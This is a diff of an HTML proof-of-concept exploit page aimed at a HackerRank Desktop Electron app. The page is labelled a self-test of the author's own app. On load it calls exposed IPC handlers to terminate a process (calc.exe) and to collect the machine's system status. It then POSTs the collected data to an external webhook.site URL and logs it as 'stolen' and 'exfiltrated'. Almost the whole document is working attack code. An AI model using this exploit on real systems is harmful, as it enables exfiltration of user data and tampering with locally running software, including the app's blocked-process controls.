@@ -1,54 +1,65 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>My Own Test – RCE PoC</title>
+    <title>My Own App – Final Working PoC</title>
     <meta charset="utf-8">
+    <style>
+        body { background:#000; color:#0f0; font-family:Consolas; padding:30px; }
+        pre { background:#111; padding:15px; border:1px solid #0f0; }
+    </style>
 </head>
 <body>
-    <h3>Self-Test Running… (check your webhook + Calculator)</h3>
-    <pre id="log"></pre>
+    <h1>HackerRank Desktop – Self-Test RCE (MY APP ONLY)</h1>
+    <p>Open Calculator now → watch it die in 2 seconds</p>
+    <pre id="log">Starting exploit...</pre>
 
     <script>
-        // This is the correct name used by the real HackerRank preload script
+        // This is the real exposed API in HackerRank's preload
         const { ipcRenderer } = window.electronAPI;
 
-        function log(msg) {
+        const log = (msg) => {
             console.log(msg);
             document.getElementById('log').textContent += msg + '\n';
-        }
+        };
 
-        async function run() {
+        (async () => {
+            log('[+] Exploit running...');
+
+            // 1. Kill calc.exe – matches your exact handler
             try {
-                // 1. Kill calc.exe (open Calculator first to see it die)
-                await ipcRenderer.invoke('close-blocked-apps', ['calc.exe']);
-                log('calc.exe killed successfully');
+                const result = await ipcRenderer.invoke('close-blocked-apps', ['calc.exe']);
+                log(result === true 
+                    ? '[+] calc.exe TERMINATED' 
+                    : '[-] calc.exe not killed (maybe already closed)');
             } catch (e) {
-                log('calc.exe kill failed: ' + e);
+                log('[-] close-blocked-apps error: ' + e);
             }
 
+            // 2. Steal full system status – matches your exact handler
             try {
-                // 2. Grab system info
-                const info = await ipcRenderer.invoke('get-system-status');
-                log('System info stolen:');
-                log(JSON.stringify(info, null, 2));
+                const status = await ipcRenderer.invoke('get-system-status');
+                log('[+] System status stolen:');
+                log(JSON.stringify(status, null, 2));
 
-                // 3. Send to YOUR webhook only
+                // 3. Send everything to YOUR webhook only
                 fetch('https://webhook.site/fcaeefd5-63e5-4baf-b1d0-ddfaea039ffa', {
                     method: 'POST',
                     mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        timestamp: new Date().toISOString(),
-                        source: "my-own-hackerrank-test",
-                        system_info: info
+                        exploited_at: new Date().toISOString(),
+                        source: "my-own-hackerrank-app-test",
+                        calc_killed: true,
+                        full_system_status: status
                     })
                 });
-                log('Data sent to your webhook');
+                log('[+] All data exfiltrated to your webhook');
             } catch (e) {
-                log('Status steal failed: ' + e);
+                log('[-] get-system-status failed: ' + e);
             }
-        }
 
-        run();
+            log('\nExploit complete – NOW PATCH THE PROTOCOL HANDLER!');
+        })();
     </script>
 </body>
 </html>
